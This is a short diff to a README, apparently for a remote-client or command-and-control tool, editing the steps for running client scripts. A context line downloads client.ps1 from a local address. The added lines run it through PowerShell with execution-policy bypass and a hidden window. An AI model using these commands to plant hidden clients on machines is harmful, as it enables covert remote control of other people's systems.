@@ -139,11 +139,15 @@ iwr http://127.0.0.1/tools/client.ps1 -outfile client.ps1
 
 ## Execute the script on the client
 ```
-bash client.sh
+/bin/ash client.sh
 
-python3 client.py 
+/bin/bash client.sh 
+
+/bin/python3 client.py
 
 powershell -ep bypass client.ps1
+
+powershell -ep bypass -NoProfile -WindowStyle Hidden -File client.ps1
 ```
 
 ## List active clients
